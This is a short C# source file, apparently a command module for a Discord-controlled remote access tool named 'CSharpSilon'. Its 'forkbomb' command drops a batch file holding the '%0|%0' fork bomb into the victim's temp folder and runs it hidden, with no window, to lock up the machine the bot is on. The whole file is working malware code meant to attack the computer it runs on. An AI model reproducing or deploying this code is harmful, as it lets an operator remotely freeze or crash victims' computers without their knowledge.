using System.Diagnostics;
using System.IO;
using Discord.Commands;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class ForkBomb : ModuleBase<SocketCommandContext>
    {
        [Command("forkbomb")]
        [Summary("Creates And Runs A Batch Script To Stress The User's CPU")]
        public async Task ForkieBomb()
        {
            await ReplyAsync("Starting Forkbomb, This May Take Some Time.");
            string path = $"{Path.GetTempPath()}\\wabbit.bat";
            File.WriteAllText(path, "%0|%0");
            Process.Start(new ProcessStartInfo
            {
                FileName = path,
                CreateNoWindow = true,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
    }
}